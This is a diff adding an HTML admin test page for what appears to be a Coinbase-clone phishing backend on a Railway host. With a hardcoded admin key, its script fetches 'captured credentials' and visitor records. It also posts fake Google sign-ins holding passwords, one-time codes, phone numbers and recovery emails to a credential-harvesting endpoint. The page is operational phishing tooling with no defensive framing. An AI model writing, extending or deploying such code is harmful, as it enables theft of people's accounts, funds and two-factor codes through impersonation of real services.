@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Admin API</title>
+    <style>
+        body {
+            font-family: monospace;
+            padding: 20px;
+            background: #1a1a2e;
+            color: #eee;
+        }
+        .section {
+            background: #16213e;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        button {
+            background: #0066ff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        pre {
+            background: #0f1419;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        .success { color: #00ff88; }
+        .error { color: #ff4444; }
+    </style>
+</head>
+<body>
+    <h1>Admin API Test</h1>
+    
+    <div class="section">
+        <h2>Test Captured Credentials</h2>
+        <button onclick="testCapturedCredentials()">Test GET /admin/captured-credentials</button>
+        <pre id="credentials-result">Click button to test...</pre>
+    </div>
+
+    <div class="section">
+        <h2>Test Visitors</h2>
+        <button onclick="testVisitors()">Test GET /admin/visitors</button>
+        <pre id="visitors-result">Click button to test...</pre>
+    </div>
+
+    <div class="section">
+        <h2>Add Test Data</h2>
+        <button onclick="addTestCredential()">Add Test Google Sign-in</button>
+        <button onclick="addTestVisitor()">Add Test Visitor</button>
+        <pre id="add-result">Click button to add test data...</pre>
+    </div>
+
+    <script>
+        const API_URL = 'https://coinbase-clone-production-8afd.up.railway.app/api';
+        const ADMIN_KEY = 'admin123';
+
+        async function testCapturedCredentials() {
+            const result = document.getElementById('credentials-result');
+            result.textContent = 'Loading...';
+            
+            try {
+                const response = await fetch(`${API_URL}/admin/captured-credentials`, {
+                    headers: {
+                        'X-Admin-Key': ADMIN_KEY
+                    }
+                });
+                
+                const data = await response.json();
+                result.innerHTML = `<span class="success">✓ Success (${response.status})</span>\n` + 
+                                  JSON.stringify(data, null, 2);
+            } catch (error) {
+                result.innerHTML = `<span class="error">✗ Error</span>\n` + error.message;
+            }
+        }
+
+        async function testVisitors() {
+            const result = document.getElementById('visitors-result');
+            result.textContent = 'Loading...';
+            
+            try {
+                const response = await fetch(`${API_URL}/admin/visitors`, {
+                    headers: {
+                        'X-Admin-Key': ADMIN_KEY
+                    }
+                });
+                
+                const data = await response.json();
+                result.innerHTML = `<span class="success">✓ Success (${response.status})</span>\n` + 
+                                  JSON.stringify(data, null, 2);
+            } catch (error) {
+                result.innerHTML = `<span class="error">✗ Error</span>\n` + error.message;
+            }
+        }
+
+        async function addTestCredential() {
+            const result = document.getElementById('add-result');
+            result.textContent = 'Adding test credential...';
+            
+            try {
+                const response = await fetch(`${API_URL}/auth/google-complete`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: `test${Date.now()}@gmail.com`,
+                        password: 'TestPassword123!',
+                        otp: '654321',
+                        phoneNumber: '+1-555-0199',
+                        recoveryEmail: 'recovery@gmail.com',
+                        provider: 'google',
+                        userDetails: {
+                            ipAddress: '192.168.1.1',
+                            userAgent: 'Mozilla/5.0 Test Browser',
+                            platform: 'MacOS',
+                            language: 'en-US',
+                            screenResolution: '1920x1080',
+                            timezone: 'America/New_York'
+                        }
+                    })
+                });
+                
+                const data = await response.json();
+                result.innerHTML = `<span class="success">✓ Credential Added (${response.status})</span>\n` + 
+                                  JSON.stringify(data, null, 2);
+                                  
+                // Refresh credentials list
+                setTimeout(testCapturedCredentials, 500);
+            } catch (error) {
+                result.innerHTML = `<span class="error">✗ Error</span>\n` + error.message;
+            }
+        }
+
+        async function addTestVisitor() {
+            const result = document.getElementById('add-result');
+            result.textContent = 'Adding test visitor...';
+            
+            try {
+                const response = await fetch(`${API_URL}/auth/track-visitor`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        page: '/',
+                        ipAddress: '192.168.1.' + Math.floor(Math.random() * 255),
+                        userAgent: 'Mozilla/5.0 Test Browser',
+                        platform: 'Windows',
+                        language: 'en-US',
+                        screenResolution: '1920x1080',
+                        timezone: 'America/New_York',
+                        referrer: 'https://google.com'
+                    })
+                });
+                
+                const data = await response.json();
+                result.innerHTML = `<span class="success">✓ Visitor Added (${response.status})</span>\n` + 
+                                  JSON.stringify(data, null, 2);
+                                  
+                // Refresh visitors list
+                setTimeout(testVisitors, 500);
+            } catch (error) {
+                result.innerHTML = `<span class="error">✗ Error</span>\n` + error.message;
+            }
+        }
+
+        // Auto-load data on page load
+        window.onload = () => {
+            testCapturedCredentials();
+            testVisitors();
+        };
+    </script>
+</body>
+</html>
